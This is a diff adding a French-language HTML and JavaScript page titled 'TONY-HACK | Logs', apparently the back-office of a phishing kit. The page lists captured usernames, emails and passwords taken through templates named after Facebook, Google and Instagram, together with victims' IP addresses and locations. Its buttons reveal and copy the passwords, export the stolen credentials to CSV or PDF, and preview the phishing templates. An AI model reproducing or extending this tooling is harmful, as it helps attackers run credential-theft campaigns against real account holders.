@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TONY-HACK | Logs</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: "Inter", sans-serif;
+            background: #0a0e14;
+            color: #e0e0e0;
+        }
+        .app { display: flex; min-height: 100vh; }
+        
+        /* Sidebar */
+        .sidebar {
+            width: 280px;
+            background: linear-gradient(180deg, #1a1f2a 0%, #0f1419 100%);
+            border-right: 1px solid #2a3342;
+            position: fixed;
+            top: 0; left: 0; bottom: 0;
+            display: flex; flex-direction: column;
+            overflow-y: auto;
+            scrollbar-width: thin;
+        }
+        .sidebar-header {
+            padding: 24px 20px;
+            border-bottom: 1px solid #2a3342;
+        }
+        .logo h2 {
+            font-size: 22px; font-weight: 700;
+            background: linear-gradient(135deg, #e94560, #ff6b6b);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        }
+        .logo p { color: #6b7a8f; font-size: 10px; margin-top: 4px; }
+        .version-tag {
+            display: inline-block; background: #e94560; color: white;
+            font-size: 9px; padding: 2px 8px; border-radius: 10px; margin-top: 6px;
+        }
+        .user-profile {
+            display: flex; align-items: center; gap: 12px;
+            padding: 16px 20px; border-bottom: 1px solid #2a3342;
+        }
+        .avatar {
+            width: 44px; height: 44px;
+            background: linear-gradient(135deg, #e94560, #ff6b6b);
+            border-radius: 50%; display: flex; align-items: center; justify-content: center;
+            font-weight: 600; font-size: 16px; color: white;
+            background-size: cover;
+        }
+        .user-info h4 { font-size: 14px; font-weight: 600; }
+        .user-info p { font-size: 11px; color: #e94560; }
+        .sidebar-nav { flex: 1; padding: 20px 12px; }
+        .nav-item {
+            display: flex; align-items: center; gap: 12px;
+            padding: 12px 16px; color: #8a9ab0;
+            text-decoration: none; border-radius: 10px;
+            margin-bottom: 4px; transition: all 0.2s;
+            font-size: 14px;
+        }
+        .nav-item i { width: 22px; font-size: 16px; }
+        .nav-item:hover { background: #2a3342; color: white; }
+        .nav-item.active { background: #e94560; color: white; }
+        .nav-divider { margin: 16px 0; border-top: 1px solid #2a3342; }
+        
+        /* Main Content */
+        .main-content {
+            flex: 1; margin-left: 280px; padding: 24px 30px;
+        }
+        .header {
+            display: flex; align-items: center; justify-content: space-between;
+            margin-bottom: 24px;
+        }
+        .header h1 { font-size: 26px; font-weight: 700; color: white; }
+        .header h1 i { color: #e94560; margin-right: 10px; }
+        .header-actions {
+            display: flex; gap: 10px;
+        }
+        .btn-icon {
+            width: 42px; height: 42px;
+            background: #1a1f2a; border: 1px solid #2a3342;
+            border-radius: 10px; color: #8a9ab0;
+            display: flex; align-items: center; justify-content: center;
+            cursor: pointer; transition: all 0.2s; font-size: 18px;
+        }
+        .btn-icon:hover { background: #e94560; color: white; }
+        
+        /* Stats */
+        .stats-grid {
+            display: grid; grid-template-columns: repeat(4,1fr);
+            gap: 16px; margin-bottom: 24px;
+        }
+        .stat-card {
+            background: #1a1f2a; border: 1px solid #2a3342;
+            border-radius: 16px; padding: 20px;
+        }
+        .stat-icon {
+            width: 40px; height: 40px; background: rgba(233,69,96,0.15);
+            border-radius: 10px; display: flex; align-items: center; justify-content: center;
+            color: #e94560; font-size: 20px; margin-bottom: 12px;
+        }
+        .stat-value { font-size: 26px; font-weight: 700; color: white; }
+        .stat-label { color: #6b7a8f; font-size: 12px; }
+        
+        /* Chart */
+        .chart-card {
+            background: #1a1f2a; border: 1px solid #2a3342;
+            border-radius: 16px; padding: 20px; margin-bottom: 24px;
+        }
+        .chart-header {
+            display: flex; align-items: center; gap: 10px;
+            margin-bottom: 16px;
+        }
+        .chart-header i { color: #e94560; }
+        .chart-header h3 { color: white; font-size: 16px; font-weight: 600; }
+        .chart-container { height: 180px; }
+        
+        /* Filters */
+        .filters-bar {
+            display: flex; align-items: center; gap: 12px;
+            margin-bottom: 20px;
+        }
+        .search-box {
+            flex: 1; display: flex; align-items: center;
+            background: #1a1f2a; border: 1px solid #2a3342;
+            border-radius: 30px; padding: 10px 18px;
+        }
+        .search-box i { color: #6b7a8f; margin-right: 10px; }
+        .search-box input {
+            background: transparent; border: none;
+            color: white; font-size: 14px; outline: none; width: 100%;
+        }
+        .search-box input::placeholder { color: #4a5568; }
+        
+        /* Table */
+        .table-container {
+            background: #1a1f2a; border: 1px solid #2a3342;
+            border-radius: 16px; overflow-x: auto;
+        }
+        table {
+            width: 100%; border-collapse: collapse;
+            min-width: 1000px;
+        }
+        th {
+            text-align: left; padding: 14px 16px;
+            background: #0f1419; color: #8a9ab0;
+            font-size: 11px; font-weight: 600; text-transform: uppercase;
+            letter-spacing: 0.5px; border-bottom: 1px solid #2a3342;
+        }
+        td {
+            padding: 12px 16px; border-bottom: 1px solid #2a3342;
+            font-size: 13px;
+        }
+        tbody tr:hover { background: rgba(233,69,96,0.05); }
+        
+        .badge {
+            display: inline-block; padding: 4px 12px;
+            border-radius: 30px; font-size: 11px; font-weight: 600;
+            background: #e94560; color: white;
+        }
+        .badge-fb { background: #1877f2; }
+        .badge-gg { background: #ea4335; }
+        .badge-ig { background: #e4405f; }
+        
+        .password-cell {
+            font-family: monospace; color: #fbbf24;
+            cursor: pointer; letter-spacing: 1px;
+        }
+        .password-cell.revealed { color: #10b981; letter-spacing: normal; }
+        
+        .action-btn {
+            width: 30px; height: 30px; background: #2a3342;
+            border: none; border-radius: 6px; color: #8a9ab0;
+            cursor: pointer; display: inline-flex; align-items: center; justify-content: center;
+            transition: all 0.2s; margin-right: 6px;
+        }
+        .action-btn:hover { background: #e94560; color: white; }
+        
+        /* Pagination */
+        .pagination {
+            display: flex; justify-content: center; gap: 8px;
+            padding: 20px 0 10px;
+        }
+        .page-btn {
+            width: 36px; height: 36px; background: #1a1f2a;
+            border: 1px solid #2a3342; border-radius: 8px;
+            color: #8a9ab0; display: flex; align-items: center; justify-content: center;
+            cursor: pointer; font-size: 14px;
+        }
+        .page-btn:hover { background: #2a3342; color: white; }
+        .page-btn.active { background: #e94560; color: white; }
+        
+        /* Toast */
+        .toast {
+            position: fixed; bottom: 24px; right: 24px;
+            background: #1a1f2a; border: 1px solid #e94560;
+            border-radius: 10px; padding: 14px 20px; color: white;
+            display: none; align-items: center; gap: 10px; z-index: 9999;
+        }
+        .toast.show { display: flex; }
+        .toast i { color: #10b981; }
+    </style>
+</head>
+<body>
+    <div class="app">
+        <!-- Sidebar -->
+        <aside class="sidebar">
+            <div class="sidebar-header">
+                <div class="logo">
+                    <h2>🔴 TONY-HACK</h2>
+                    <p>ULTRA PRO v4.0</p>
+                    <span class="version-tag">ENTERPRISE</span>
+                </div>
+            </div>
+            <div class="user-profile">
+                <div class="avatar" id="sidebarAvatar">A</div>
+                <div class="user-info">
+                    <h4 id="sidebarName">Admin</h4>
+                    <p>Super Admin</p>
+                </div>
+            </div>
+            <nav class="sidebar-nav">
+                <a href="/" class="nav-item"><i class="fas fa-home"></i> Dashboard</a>
+                <a href="/campaigns" class="nav-item"><i class="fas fa-bullseye"></i> Campagne Optimiser</a>
+                <a href="/builder" class="nav-item"><i class="fas fa-code"></i> Code Editor</a>
+                <a href="/templates" class="nav-item"><i class="fas fa-file-code"></i> Templates</a>
+                <a href="/statistics" class="nav-item"><i class="fas fa-chart-bar"></i> Statistiques</a>
+                <a href="/logs" class="nav-item active"><i class="fas fa-history"></i> Logs</a>
+                <div class="nav-divider"></div>
+                <a href="/settings" class="nav-item"><i class="fas fa-cog"></i> Paramètres</a>
+                <a href="/profile" class="nav-item"><i class="fas fa-user"></i> Profil</a>
+                <a href="#" class="nav-item" id="logoutBtn"><i class="fas fa-sign-out-alt"></i> Déconnexion</a>
+            </nav>
+        </aside>
+        
+        <!-- Main Content -->
+        <main class="main-content">
+            <header class="header">
+                <h1><i class="fas fa-history"></i> Logs ULTRA PRO</h1>
+                <div class="header-actions">
+                    <button class="btn-icon" id="exportCsvBtn" title="Exporter CSV"><i class="fas fa-download"></i></button>
+                    <button class="btn-icon" id="exportPdfBtn" title="Exporter PDF"><i class="fas fa-file-pdf"></i></button>
+                    <button class="btn-icon" id="clearBtn" title="Effacer tout"><i class="fas fa-trash"></i></button>
+                    <button class="btn-icon" id="refreshBtn" title="Rafraîchir"><i class="fas fa-sync-alt"></i></button>
+                </div>
+            </header>
+            
+            <!-- Stats -->
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-icon"><i class="fas fa-database"></i></div>
+                    <div class="stat-value" id="totalLogs">0</div>
+                    <div class="stat-label">Total Captures</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon"><i class="fas fa-calendar-day"></i></div>
+                    <div class="stat-value" id="todayLogs">0</div>
+                    <div class="stat-label">Aujourd'hui</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon"><i class="fas fa-globe"></i></div>
+                    <div class="stat-value" id="uniqueIps">0</div>
+                    <div class="stat-label">IPs Uniques</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon"><i class="fas fa-file-code"></i></div>
+                    <div class="stat-value" id="uniqueTemplates">0</div>
+                    <div class="stat-label">Templates Actifs</div>
+                </div>
+            </div>
+            
+            <!-- Chart -->
+            <div class="chart-card">
+                <div class="chart-header">
+                    <i class="fas fa-chart-line"></i>
+                    <h3>Évolution des Captures (7 jours)</h3>
+                </div>
+                <div class="chart-container">
+                    <canvas id="trendChart"></canvas>
+                </div>
+            </div>
+            
+            <!-- Filters -->
+            <div class="filters-bar">
+                <div class="search-box">
+                    <i class="fas fa-search"></i>
+                    <input type="text" id="searchInput" placeholder="Rechercher email, IP, template, localisation...">
+                </div>
+            </div>
+            
+            <!-- Table -->
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Template</th>
+                            <th>Username / Email</th>
+                            <th>Password</th>
+                            <th>Adresse IP</th>
+                            <th>Localisation</th>
+                            <th>Date & Heure</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="logsBody"></tbody>
+                </table>
+                
+                <!-- Pagination -->
+                <div class="pagination" id="pagination"></div>
+            </div>
+        </main>
+    </div>
+    
+    <!-- Toast -->
+    <div class="toast" id="toast">
+        <i class="fas fa-check-circle"></i>
+        <span id="toastMsg"></span>
+    </div>
+    
+    <script>
+        let allLogs = [];
+        let filteredLogs = [];
+        let currentPage = 1;
+        const perPage = 10;
+        let chart;
+        
+        // Avatar
+        fetch('/api/profile').then(r=>r.json()).then(d=>{
+            if(d.avatar) document.getElementById('sidebarAvatar').style.backgroundImage = `url(${d.avatar})`;
+            document.getElementById('sidebarName').textContent = d.username || 'Admin';
+        });
+        
+        // Load logs
+        async function loadLogs() {
+            const r = await fetch('/api/logs/list');
+            allLogs = await r.json();
+            filteredLogs = [...allLogs];
+            
+            updateStats();
+            renderChart();
+            renderTable();
+            renderPagination();
+        }
+        
+        function updateStats() {
+            document.getElementById('totalLogs').textContent = allLogs.length;
+            const today = new Date().toISOString().split('T')[0];
+            document.getElementById('todayLogs').textContent = allLogs.filter(l => l.timestamp?.startsWith(today)).length;
+            document.getElementById('uniqueIps').textContent = [...new Set(allLogs.map(l => l.ip))].length;
+            document.getElementById('uniqueTemplates').textContent = [...new Set(allLogs.map(l => l.template_id))].length;
+        }
+        
+        function renderChart() {
+            const ctx = document.getElementById('trendChart').getContext('2d');
+            const dates = [...new Set(allLogs.map(l => l.timestamp?.split(' ')[0]))].sort().slice(-7);
+            const data = dates.map(d => allLogs.filter(l => l.timestamp?.startsWith(d)).length);
+            
+            if (chart) chart.destroy();
+            chart = new Chart(ctx, {
+                type: 'line',
+                data: {
+                    labels: dates.map(d => new Date(d).toLocaleDateString('fr', {weekday:'short'})),
+                    datasets: [{
+                        label: 'Captures',
+                        data: data,
+                        borderColor: '#e94560',
+                        backgroundColor: 'rgba(233,69,96,0.1)',
+                        tension: 0.4,
+                        fill: true
+                    }]
+                },
+                options: {
+                    responsive: true, maintainAspectRatio: false,
+                    plugins: { legend: { display: false } }
+                }
+            });
+        }
+        
+        function renderTable() {
+            const start = (currentPage - 1) * perPage;
+            const pageLogs = filteredLogs.slice(start, start + perPage);
+            const tbody = document.getElementById('logsBody');
+            
+            if (pageLogs.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="7" style="text-align:center;padding:40px;color:#6b7a8f;">Aucune donnée capturée</td></tr>`;
+                return;
+            }
+            
+            tbody.innerHTML = pageLogs.map(log => {
+                let badgeClass = 'badge';
+                const tpl = (log.template_name || '').toLowerCase();
+                if (tpl.includes('facebook')) badgeClass = 'badge badge-fb';
+                else if (tpl.includes('google')) badgeClass = 'badge badge-gg';
+                else if (tpl.includes('instagram')) badgeClass = 'badge badge-ig';
+                
+                return `<tr>
+                    <td><span class="${badgeClass}">${log.template_name || log.template_id}</span></td>
+                    <td>${log.username || '-'}</td>
+                    <td><span class="password-cell" onclick="revealPassword(this, '${log.password || ''}')">••••••••</span></td>
+                    <td>${log.ip || '-'}</td>
+                    <td>${log.location || '🌍 Unknown'}</td>
+                    <td>${log.timestamp || '-'}</td>
+                    <td>
+                        <button class="action-btn" onclick="copyCredential('${log.username || ''}', '${log.password || ''}')"><i class="fas fa-copy"></i></button>
+                        <button class="action-btn" onclick="window.open('/t/${log.template_id}')"><i class="fas fa-eye"></i></button>
+                    </td>
+                </tr>`;
+            }).join('');
+        }
+        
+        function revealPassword(el, pass) {
+            if (el.textContent === '••••••••') {
+                el.textContent = pass;
+                el.classList.add('revealed');
+            } else {
+                el.textContent = '••••••••';
+                el.classList.remove('revealed');
+            }
+        }
+        
+        function copyCredential(u, p) {
+            navigator.clipboard?.writeText(`Username: ${u}\nPassword: ${p}`);
+            showToast('✅ Identifiants copiés');
+        }
+        
+        function renderPagination() {
+            const total = Math.ceil(filteredLogs.length / perPage);
+            const pag = document.getElementById('pagination');
+            let html = '';
+            for (let i = 1; i <= Math.min(total, 5); i++) {
+                html += `<div class="page-btn ${i === currentPage ? 'active' : ''}" onclick="goToPage(${i})">${i}</div>`;
+            }
+            pag.innerHTML = html;
+        }
+        
+        function goToPage(p) { currentPage = p; renderTable(); renderPagination(); }
+        
+        function showToast(m) {
+            const t = document.getElementById('toast');
+            document.getElementById('toastMsg').textContent = m;
+            t.classList.add('show');
+            setTimeout(() => t.classList.remove('show'), 3000);
+        }
+        
+        // Search
+        document.getElementById('searchInput').addEventListener('input', e => {
+            const q = e.target.value.toLowerCase();
+            filteredLogs = allLogs.filter(l => 
+                (l.username||'').toLowerCase().includes(q) ||
+                (l.ip||'').includes(q) ||
+                (l.template_name||'').toLowerCase().includes(q) ||
+                (l.location||'').toLowerCase().includes(q)
+            );
+            currentPage = 1;
+            renderTable();
+            renderPagination();
+        });
+        
+        // Export CSV
+        document.getElementById('exportCsvBtn').addEventListener('click', () => {
+            let csv = "Template,Username,Password,IP,Location,Date\n";
+            filteredLogs.forEach(l => csv += `"${l.template_name||l.template_id}","${l.username}","${l.password}","${l.ip}","${l.location||'Unknown'}","${l.timestamp}"\n`);
+            const blob = new Blob(["\ufeff"+csv], {type:'text/csv'});
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = 'logs.csv';
+            a.click();
+            showToast('✅ CSV exporté');
+        });
+        
+        // Export PDF
+        document.getElementById('exportPdfBtn').addEventListener('click', () => {
+            window.open('/api/logs/export/pdf', '_blank');
+        });
+        
+        // Clear
+        document.getElementById('clearBtn').addEventListener('click', async () => {
+            if (!confirm('Effacer tous les logs ?')) return;
+            await fetch('/api/logs/clear', {method:'POST'});
+            allLogs = []; filteredLogs = [];
+            updateStats(); renderTable(); renderChart(); renderPagination();
+            showToast('✅ Logs effacés');
+        });
+        
+        // Refresh
+        document.getElementById('refreshBtn').addEventListener('click', loadLogs);
+        
+        // Déconnexion
+        document.getElementById('logoutBtn').addEventListener('click', e => {
+            e.preventDefault();
+            if (confirm('Voulez-vous vous déconnecter ?')) window.location.href = '/logout';
+        });
+        
+        loadLogs();
+    </script>
+</body>
+</html>
